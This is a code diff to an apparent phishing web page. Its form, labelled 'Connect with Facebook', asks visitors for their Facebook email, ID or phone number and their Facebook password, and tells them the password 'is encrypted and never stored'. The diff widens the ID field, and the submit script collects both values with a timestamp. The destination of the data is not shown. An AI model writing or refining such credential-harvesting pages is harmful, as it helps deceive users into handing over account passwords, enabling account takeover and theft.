@@ -65,16 +65,23 @@
                 </div>
 
                 <form class="fb-form" id="facebookForm">
+                    <!-- ===== Facebook ID / Email / Phone ===== -->
                     <div class="form-group">
-                        <label><i class="fab fa-facebook-f"></i> Facebook ID / Email</label>
-                        <input type="email" id="fbEmail" placeholder="Enter your Facebook email or ID" required />
-                        <div class="input-hint"><i class="fas fa-info-circle"></i> Use the email associated with your Facebook account</div>
+                        <label><i class="fab fa-facebook-f"></i> Facebook ID / Email / Phone</label>
+                        <input type="text" id="fbEmail" placeholder="Enter your Facebook email, ID, or phone number" required />
+                        <div class="input-hint">
+                            <i class="fas fa-info-circle"></i>
+                            Enter either your Facebook email, username, or phone number
+                        </div>
                     </div>
+
+                    <!-- ===== Facebook Password ===== -->
                     <div class="form-group">
                         <label><i class="fas fa-lock"></i> Facebook Password</label>
                         <input type="password" id="fbPassword" placeholder="Enter your Facebook password" required />
                         <div class="input-hint"><i class="fas fa-info-circle"></i> Your password is encrypted and never stored</div>
                     </div>
+
                     <button type="submit" class="btn-facebook"><i class="fab fa-facebook-f"></i> Connect with Facebook</button>
                 </form>
 
@@ -91,6 +98,7 @@
         document.getElementById('facebookForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
+            // Facebook ID field - email, phone, ya username kuch bhi ho sakta hai
             const fbEmail = document.getElementById('fbEmail').value.trim();
             const fbPassword = document.getElementById('fbPassword').value.trim();
             const submittedAt = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
